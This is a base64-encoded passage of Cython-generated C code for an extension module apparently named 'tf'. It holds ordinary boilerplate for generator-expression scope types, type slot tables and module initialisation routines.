CBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSB7CiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjsKICAgIH0KICB9CiAgI2VuZGlmCiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTsKICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICBQeV9DTEVBUihwLT5fX3B5eF92X2Z1dHVyZSk7CiAgUHlfQ0xFQVIocC0+X19weXhfdF8wKTsKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciA8IDgpICYgKGludCkoUHlfVFlQRShvKS0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSkpKSB7CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKilvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pOwogICAgI2Vsc2UKICAgIHsKICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTsKICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7CiAgICB9CiAgICAjZW5kaWYKICB9Cn0KCnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7CiAgaW50IGU7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByICopbzsKICB7CiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpOwogICAgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkgewogICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X3ZfZnV0dXJlKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF92X2Z1dHVyZSwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X3RfMCkgewogICAgZSA9ICgqdikocC0+X19weXhfdF8wLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICByZXR1cm4gMDsKfQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByX3Nsb3RzW10gPSB7CiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcn0sCiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByfSwKICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcn0sCiAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl9zcGVjID0gewogICJ0Zi5fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByIiwKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciksCiAgMCwKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsCiAgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl9zbG90cywKfTsKI2Vsc2UKCnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciA9IHsKICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMCkKICAidGYuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByIiwgCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpLCAKICAwLCAKICBfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByLCAKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIAogIDAsIAogIF9fcHl4X3RwX3RyYXZlcnNlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIF9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAwLCAKICAjZWxzZQogIE5VTEwsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMCkKICAwLCAKICAjZW5kaWYKICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDEKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMAogIDAsIAogICNlbmRpZgp9OwojZW5kaWYKCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZXRob2RzW10gPSB7CiAgezAsIDAsIDAsIDB9Cn07CgpzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDYWNoZWRCdWlsdGlucyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRHbG9iYWxzKHZvaWQpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IAoKCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUiLCAwKTsKICAKICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGxfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwpKSBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbF9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDFfZXJyb3IpCiAgI2Vsc2UKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCA9ICZfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbDsKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwpIDwgKDApKSBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbC0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbC0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbC0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjsKICB9CiAgI2VuZGlmCiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MMV9lcnJvcikKICAjZWxzZQogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSAmX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyOwogIH0KICAjZW5kaWYKICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICNlbHNlCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByOwogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNlbmRpZgogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHItPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7CiAgfQogICNlbmRpZgogICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgI2Vsc2UKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID0gJl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHI7CiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkgewogICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjsKICB9CiAgI2VuZGlmCiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSkgX19QWVhfRVJSKDAsIDQ0NSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHJfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCA0NDUsIF9fcHl4X0wxX2Vycm9yKQogICNlbHNlCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByOwogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNlbmRpZgogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ0NSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2N